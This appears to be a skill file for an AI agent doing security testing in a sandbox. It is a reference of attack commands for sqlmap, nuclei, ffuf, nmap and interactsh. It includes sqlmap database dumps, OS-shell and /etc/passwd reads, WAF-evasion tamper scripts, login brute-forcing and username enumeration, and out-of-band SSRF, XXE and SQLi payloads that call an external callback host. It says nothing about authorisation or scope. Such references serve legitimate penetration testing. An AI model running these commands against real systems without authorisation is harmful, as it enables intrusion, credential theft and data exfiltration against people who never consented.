---
name: tool-mastery
description: Expert usage patterns for sqlmap, nuclei, ffuf, nmap, and other security tools available in the sandbox
---

# Security Tool Mastery

This skill teaches optimal usage of the professional security tools available in the Docker sandbox. Knowing tool flags and patterns is the difference between finding real bugs and wasting time.

## sqlmap — SQL Injection Automation

### Initial Detection
```bash
# Basic test with level/risk increase
sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3 --random-agent

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch --level=5 --risk=3

# With cookie/auth
sqlmap -u "http://target/api/items?id=1" --cookie="session=abc123" --batch --level=5 --risk=3

# JSON body
sqlmap -u "http://target/api/search" --data='{"query":"test"}' --headers="Content-Type: application/json" --batch --level=5 --risk=3
```

### Exploitation & Data Extraction
```bash
# Enumerate databases
sqlmap -u "URL" --batch --dbs

# Enumerate tables
sqlmap -u "URL" --batch -D database_name --tables

# Dump specific table
sqlmap -u "URL" --batch -D database_name -T users --dump

# Get DB user privileges
sqlmap -u "URL" --batch --privileges

# OS shell (if FILE privilege)
sqlmap -u "URL" --batch --os-shell

# Read file from server
sqlmap -u "URL" --batch --file-read="/etc/passwd"
```

### WAF Bypass / Advanced
```bash
# With tamper scripts for WAF bypass
sqlmap -u "URL" --batch --tamper=space2comment,between,randomcase

# Common tamper combinations
# Generic: space2comment,between,randomcase,charencode
# MySQL: space2mysqlblank,equaltolike,greatest
# MSSQL: space2mssqlhash,between,charencode

# Specific technique selection
sqlmap -u "URL" --batch --technique=BT  # Boolean + Time only (stealthier)
sqlmap -u "URL" --batch --technique=U   # UNION only (fastest data extraction)

# Second-order injection
sqlmap -u "http://target/register" --data="user=test&email=INJECT_HERE" --second-url="http://target/profile" --batch

# Through proxy
sqlmap -u "URL" --batch --proxy="http://127.0.0.1:8080"
```

### Key Flags Reference
| Flag | Purpose |
|------|---------|
| `--level=5` | Test cookies, user-agent, referer, additional params |
| `--risk=3` | Include OR-based, heavy time-based, stacked queries |
| `--batch` | Non-interactive (required for automation) |
| `--random-agent` | Randomize User-Agent |
| `--technique=BEUSTQ` | Select techniques (Boolean/Error/Union/Stacked/Time/Query) |
| `--tamper=` | Apply evasion scripts |
| `--threads=10` | Parallel requests (faster) |
| `--time-sec=5` | Time-based blind delay (increase if network is slow) |
| `--string="welcome"` | String that appears on true response (helps boolean blind) |
| `--not-string="error"` | String that appears on false response |
| `--prefix/--suffix` | Custom injection prefix/suffix for unusual contexts |

## nuclei — Template-Based Vulnerability Scanner

### Scanning Modes
```bash
# Full scan against target
nuclei -u https://target.com -o nuclei_results.txt

# Specific templates
nuclei -u https://target.com -t cves/ -o cve_results.txt
nuclei -u https://target.com -t vulnerabilities/ -o vuln_results.txt
nuclei -u https://target.com -t exposures/ -o exposure_results.txt
nuclei -u https://target.com -t misconfiguration/ -o misconfig_results.txt

# By severity
nuclei -u https://target.com -severity critical,high -o critical_results.txt

# Technology detection
nuclei -u https://target.com -t technologies/ -silent

# Multiple targets from file
nuclei -l targets.txt -severity critical,high -o batch_results.txt

# With rate limiting (stealth)
nuclei -u https://target.com -rate-limit 10 -bulk-size 5

# Tags-based (e.g., all RCE-related)
nuclei -u https://target.com -tags rce,sqli,xss,ssrf -o tagged_results.txt
```

### Key Nuclei Tips
- Run `nuclei -update-templates` before scanning for latest CVE checks
- Use `-severity critical,high` first for quick wins, then broaden
- Use `-tags` to focus: `cve,rce,sqli,xss,lfi,ssrf,exposed-panels,misconfig`
- Check `nuclei -tl` to list all available templates
- Custom headers: `-H "Authorization: Bearer TOKEN"`

## ffuf — Fuzzing & Brute Force

### Content Discovery
```bash
# Directory brute force
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -o dirs.json -of json

# File discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200 -o files.json -of json

# Extension fuzzing
ffuf -u https://target.com/admin.FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -mc 200

# Virtual host discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs <default_size>

# API parameter discovery 
ffuf -u "https://target.com/api/users?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs <default_size>
```

### Authentication Attacks
```bash
# Password brute force (use -fc to filter failed login responses)
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -fc 401,403 -H "Content-Type: application/x-www-form-urlencoded"

# Username enumeration (different response size = valid user)
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=invalid" -w /usr/share/seclists/Usernames/Names/names.txt -H "Content-Type: application/x-www-form-urlencoded" -mr "Invalid password"
```

### Key ffuf Tips
| Flag | Purpose |
|------|---------|
| `-mc 200,301,302,403` | Match status codes |
| `-fc 404,500` | Filter status codes |
| `-fs <size>` | Filter by response size (eliminate default pages) |
| `-fw <words>` | Filter by word count |
| `-fl <lines>` | Filter by line count |
| `-fr "regex"` | Filter by regex match |
| `-mr "pattern"` | Match by regex |
| `-rate 50` | Requests per second |
| `-recursion -recursion-depth 2` | Recursive fuzzing |
| `-X POST` | HTTP method |
| `-H "Cookie: sess=abc"` | Custom headers |

## nmap — Network Scanning

### Port Scanning
```bash
# Fast full port scan
nmap -sS -p- --min-rate 5000 -T4 target.com

# Service version + default scripts on specific ports
nmap -sV -sC -p 80,443,8080,8443,3306,5432,27017 target.com

# Quick high-value scan
nmap -sV --top-ports 1000 -T4 target.com

# UDP scan (slow but important)
nmap -sU --top-ports 50 target.com
```

### NSE Scripts for Web
```bash
# HTTP enumeration
nmap --script http-enum,http-title,http-headers,http-methods -p 80,443 target.com

# Vulnerability scanning
nmap --script vuln -p 80,443 target.com

# SSL/TLS checks
nmap --script ssl-enum-ciphers,ssl-cert -p 443 target.com
```

## interactsh — Out-of-Band Testing

### Setup & Usage
```bash
# Start interactsh client (generates unique domains)
interactsh-client -v 2>&1 &
# Note the generated domain: xyz.oast.live

# Use in SSRF payloads
curl "http://target/fetch?url=http://xyz.oast.live"

# Use in XXE payloads
# <!ENTITY xxe SYSTEM "http://xyz.oast.live">

# Use in blind SQLi OOB
# MySQL: LOAD_FILE('\\\\xyz.oast.live\\a')
# MSSQL: exec xp_dirtree '\\xyz.oast.live\a'

# Check for DNS/HTTP callbacks in interactsh output
```

## Caido Proxy — Traffic Interception

```bash
# Caido runs on port 8080 in the sandbox
# Route traffic through it
curl --proxy http://127.0.0.1:8080 https://target.com

# All browser traffic goes through Caido when configured
# Use Caido for:
# - Request replay/modification
# - WebSocket interception
# - Response analysis
# - Scope control
```

## General Best Practices

1. **Always start with recon** — don't spray attacks at unknown surface
2. **Multiple tools, same target** — nuclei finds different things than manual testing
3. **Verify tool findings** — automated tools produce false positives; always manually confirm
4. **Save output** — every tool command should output to a file (`-o`, `-oN`, `> file`)
5. **Rate limit** — don't DoS the target; use delays and throttling
6. **Check tool versions** — `sqlmap --version`, `nuclei --version` to know capabilities
7. **Chain tools** — nmap → nuclei → sqlmap is a natural pipeline
